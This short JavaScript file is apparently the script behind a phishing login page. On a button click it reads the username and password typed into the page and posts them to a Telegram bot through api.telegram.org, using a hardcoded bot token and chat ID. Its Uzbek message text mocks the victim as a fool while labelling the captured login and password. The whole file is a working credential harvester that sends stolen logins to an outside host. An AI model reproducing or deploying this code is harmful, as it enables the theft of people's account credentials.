let input = document.querySelectorAll("input")
let btn = document.querySelector(".btn")

let CHAT_ID = "5873860881"
let TOKEN = "8885891305:AAGa14Peur-_bYD-ujSvZxNg9EE7jS5-fH0"

async function handleLogin() {
    let username = input[0].value
    let password = input[1].value

    if(!username || !password) {
        return alert("Please make sure you wrote all")
    }

    let message = `
    Lo'x odamni login paroli\n
    Username: ${username}
    Password: ${password}
    `

    try{
        const request = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type" : "application/json"},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        })
        const response = request.json()
        console.log(response)
    }catch(e) {
        console.error(e)
    }
}
btn.addEventListener("click", handleLogin)